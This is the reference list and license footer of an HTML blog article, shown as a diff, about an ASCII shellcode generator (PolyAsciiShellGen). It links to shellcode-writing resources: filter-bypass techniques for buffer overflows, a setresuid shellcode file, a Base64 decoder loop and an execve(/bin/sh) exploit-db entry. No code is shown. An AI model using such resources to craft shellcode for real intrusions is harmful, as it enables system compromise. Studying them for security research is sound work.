+         </p>
+         <h2 id="6-links">
+          6 - Links
+         </h2>
+         <hr/>
+         <div class="ap">
+          <p>
+           [1] Bypassing MSB Data Filters for Buffer Overflow Exploits on Intel Platforms, Riley Eller "caezar":
+           <br/>
+           <a href="http://julianor.tripod.com/bc/bypass-msb.txt" target="_blank">
+            http://julianor.tripod.com/bc/bypass-msb.txt
+           </a>
+          </p>
+          <p>
+           [2] x86 printable opcode table:
+           <br/>
+           <a href="../../blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-printable-opcode-table.pdf" target="_blank">
+            https://VincentDary.github.io/blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-printable-opcode-table.pdf
+           </a>
+          </p>
+          <p>
+           [3] Github PolyAsciiShellGen:
+           <br/>
+           <a href="https://github.com/VincentDary/PolyAsciiShellGen" target="_blank">
+            https://github.com/VincentDary/PolyAsciiShellGen
+           </a>
+          </p>
+          <p>
+           [4] setresuid_shellcode.asm:
+           <br/>
+           <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/setresuid_shellcode.asm" target="_blank">
+            https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/setresuid_shellcode.asm
+           </a>
+          </p>
+          <p>
+           [5] x86 ASCII Base64 decoder loop, Shellcoder's handbook p207:
+           <br/>
+           <a href="../../blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-base64-ASCII-shellcode-shellcoders-handbook.pdf" target="_blank">
+            https://VincentDary.github.io/blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-printable-opcode-table.pdf
+           </a>
+          </p>
+          <p>
+           [6] Marco Ivaldi: Shellcode (16 bytes) - Linux/x86 - execve(/bin/sh) + Re-Use Of Strings In .rodata:
+           <br/>
+           <a href="https://www.exploit-db.com/exploits/13358/" target="_blank">
+            https://www.exploit-db.com/exploits/13358/
+           </a>
+          </p>
+         </div>
+        </hr>
+       </div>
+       <div class="content">
+        <p>
+         <br/>
+         <br/>
+         <br/>
+         <br/>
+         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
+          <img src="/static/img/by-nc-nd.eu.png" width="180"/>
+         </a>
+         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
+          <img src="/static/img/by-nc-nd.png" width="180"/>
+         </a>
+         <br/>
+         <br/>
+         This article was written by Vincent Dary and is licensed under the terms of the
+         <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">
+          Creative Commons Attribution-NonCommercial-NoDerivs 4.0 International (CC BY-NC-ND 4.0)
+         </a>
+         .
+         <br/>
+         <br/>
+         Put a mandatory link to the entire original source in case of copy or distribution.
+        </p>
+       </div>
+      </div>
+     </div>
+     <div class="by" id="chunk-right">
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+ <style>
+  .b { justify-content: center; margin-left: 0px; }
+  a { color:  blue; }
+ </style>
+</html>
